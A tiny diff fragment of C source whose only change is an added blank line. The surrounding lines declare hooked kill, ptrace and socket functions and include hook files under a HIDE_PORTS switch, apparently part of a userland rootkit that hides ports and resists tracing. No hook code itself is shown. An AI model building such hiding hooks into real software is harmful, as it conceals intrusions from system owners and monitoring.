@@ -34,6 +34,7 @@ int kill(pid_t pid, int sig);
 long ptrace(void *request, pid_t pid, void *addr, void *data);
 #include "hooks/ptrace.c"
 #endif
+
 #ifdef HIDE_PORTS
 int socket(int domain, int type, int protocol);
 #include "hooks/socket.c"
